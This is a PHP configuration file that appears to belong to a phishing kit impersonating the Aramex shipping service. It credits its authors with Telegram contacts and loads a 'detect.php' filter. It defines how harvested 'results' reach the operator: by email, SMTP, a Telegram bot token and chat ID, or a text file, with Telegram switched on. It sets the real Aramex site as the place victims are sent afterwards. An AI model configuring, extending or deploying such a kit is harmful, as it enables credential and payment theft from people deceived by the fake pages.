<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    session_start();
    error_reporting(0);
    require_once 'functions.php';
	require_once 'detect.php';
	define("LINKTR", 'LINK HERE');
    define("LANGTR", '?add somthing here');
    define("RECEIVER", 'aloa@gmail.com');
    define("TELEGRAM_TOKEN", 'token here');
    define("TELEGRAM_CHAT_ID", 'chat id here');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", 'my_result002.txt');
    define("OFFICIAL_WEBSITE", 'https://www.aramex.com/us/en/ship/express-services');

    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1
?>